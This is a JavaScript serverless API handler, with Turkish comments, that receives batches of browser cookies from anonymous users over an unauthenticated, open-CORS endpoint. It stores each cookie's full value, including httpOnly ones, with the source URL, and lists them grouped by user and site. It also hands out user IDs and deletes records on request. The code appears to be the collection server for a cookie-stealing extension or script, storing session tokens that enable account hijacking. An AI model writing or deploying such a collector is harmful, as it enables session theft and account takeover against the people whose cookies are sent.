let posts = [];
let lastUserId = 0;

export default function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept, X-Retry-Count, X-Request-Time');

  // Handle OPTIONS request for CORS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    switch (req.method) {
      case 'POST':
        handlePost(req, res);
        break;
      case 'GET':
        handleGet(req, res);
        break;
      case 'PUT':
        handlePut(req, res);
        break;
      case 'DELETE':
        handleDelete(req, res);
        break;
      default:
        res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Error in webhook handler:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

function formatCookieForDisplay(cookie) {
  return {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
    domain: cookie["Host raw"],
    name: cookie["Name raw"],
    value: cookie["Content raw"],
    expires: cookie["Expires"],
    path: cookie["Path raw"],
    secure: cookie["Send for raw"] === "true",
    httpOnly: cookie["HTTP only raw"] === "true",
    sameSite: cookie["SameSite raw"],
    hostOnly: cookie["This domain only raw"] === "true",
    firstPartyDomain: cookie["First Party Domain"],
    timestamp: new Date().toISOString()
  };
}

function handlePost(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  // Her bir cookie'yi ayrı bir kayıt olarak sakla
  if (body.cookies && Array.isArray(body.cookies)) {
    const formattedCookies = body.cookies.map(cookie => ({
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
      userId: body.userId,
      url: body.url,
      timestamp: body.timestamp || Date.now(),
      cookie: formatCookieForDisplay(cookie)
    }));

    posts.unshift(...formattedCookies);

    // Maksimum 1000 kayıt tut
    if (posts.length > 1000) {
      posts = posts.slice(0, 1000);
    }
  }

  res.status(200).json({ 
    status: 'ok', 
    received: {
      userId: body.userId,
      url: body.url,
      cookieCount: body.cookies ? body.cookies.length : 0,
      timestamp: new Date().toISOString()
    }
  });
}

function handleGet(req, res) {
  const { userId, limit, id } = req.query;
  
  // Tek bir cookie detayını getir
  if (id) {
    const cookie = posts.find(post => post.id === id);
    if (cookie) {
      return res.status(200).json(cookie);
    }
    return res.status(404).json({ error: 'Cookie not found' });
  }

  let filteredPosts = posts;

  if (userId) {
    filteredPosts = posts.filter(post => post.userId === userId);
  }

  // Grupla ve sırala
  const groupedPosts = filteredPosts.reduce((acc, post) => {
    const key = `${post.userId}-${post.url}-${new Date(post.timestamp).toISOString().split('T')[0]}`;
    if (!acc[key]) {
      acc[key] = {
        userId: post.userId,
        url: post.url,
        date: new Date(post.timestamp).toISOString().split('T')[0],
        cookieCount: 0,
        cookies: []
      };
    }
    acc[key].cookieCount++;
    acc[key].cookies.push(post);
    return acc;
  }, {});

  // Sıralı liste oluştur
  const sortedGroups = Object.values(groupedPosts)
    .sort((a, b) => new Date(b.date) - new Date(a.date));

  // Limit uygula
  const limitedGroups = limit ? sortedGroups.slice(0, parseInt(limit)) : sortedGroups;

  res.status(200).json(limitedGroups);
}

function handlePut(req, res) {
  lastUserId++;
  res.status(200).json({ userId: lastUserId.toString() });
}

function handleDelete(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  if (body.userId) {
    posts = posts.filter(post => post.userId !== body.userId);
  } else if (body.ids && Array.isArray(body.ids)) {
    posts = posts.filter(post => !body.ids.includes(post.id));
  } else if (body.deleteAll === true) {
    posts = [];
  }

  res.status(200).json({ status: 'ok', message: 'Data deleted successfully' });
}